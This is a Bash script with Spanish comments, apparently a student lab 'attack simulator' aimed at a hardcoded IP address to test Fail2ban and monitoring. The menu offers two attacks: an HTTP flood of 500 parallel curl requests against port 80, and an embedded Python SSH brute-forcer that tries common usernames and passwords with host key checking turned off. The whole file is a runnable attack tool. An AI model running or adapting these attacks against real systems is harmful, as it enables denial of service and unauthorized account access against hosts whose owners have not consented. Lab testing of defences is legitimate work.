#!/usr/bin/env bash

# Dirección IP del servidor víctima
VICTIMA="100.94.217.57"

mostrar_menu() {
    clear
    echo "========================================================"
    echo "  PROYECTO 2 - CASO DE ESTUDIO: SIMULADOR DE ATAQUES  "
    echo "========================================================"
    echo "Servidor Objetivo: $VICTIMA"
    echo "--------------------------------------------------------"
    echo "1) Ataque por saturación al puerto HTTP (Puerto 80)"
    echo "2) Ataque de fuerza bruta al puerto SSH (Puerto 22)"
    echo "3) Salir"
    echo "========================================================"
    echo -n "Seleccione una opción [1-3]: "
}

ejecutar_ataque_ssh() {
    echo -e "\n[+] Iniciando ataque de fuerza bruta SSH (Python integrado)..."
    echo "[!] Esto debería activar las reglas de Fail2ban en /var/log/secure."

    # Ejecutamos Python directamente desde Bash pasando el código como string
    python3 - <<EOF
import subprocess
import time

host = "$VICTIMA"
usuarios = ["root", "admin", "usuario1", "soporte", "invitado"]
passwords = ["123456", "password", "admin123", "root2026", "secret"]

intento = 1
for u in usuarios:
    for p in passwords:
        print(f"[{intento}] Probando credenciales -> {u}:{p}")

        # Comando SSH con timeout corto para no trabar el script
        comando = [
            "ssh",
            "-o", "NumberOfPasswordPrompts=1",
            "-o", "ConnectTimeout=2",
            "-o", "StrictHostKeyChecking=no",
            f"{u}@{host}",
            "exit"
        ]

        try:
            subprocess.run(comando, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        except Exception:
            pass

        intento += 1
        time.sleep(0.05)

print("\n[+] Ráfaga de fuerza bruta SSH completada.")
EOF
}

# Bucle principal del menú
while true; do
    mostrar_menu
    read -r opcion
    case $opcion in
        1)
            echo -e "\n[+] Iniciando saturación HTTP a http://$VICTIMA/..."
            echo "[!] Monitoree Wireshark o el consumo de CPU en el servidor ahora."

            # Tu bucle original con '&' al final para lanzar las peticiones en paralelo
            for i in {1..500}; do
                curl -s -o /dev/null "http://$VICTIMA/" &
            done
            wait # Espera a que terminen todas las peticiones en segundo plano

            echo -e "\n[+] Ataque HTTP finalizado."
            read -p "Presione [Enter] para continuar..."
            ;;
        2)
            ejecutar_ataque_ssh
            read -p "Presione [Enter] para continuar..."
            ;;
        3)
            echo -e "\nSaliendo del script. ¡Éxito en la prueba del proyecto!"
            exit 0
            ;;
        *)
            echo -e "\n[-] Opción inválida. Intente de nuevo."
            sleep 2
            ;;
    esac
done
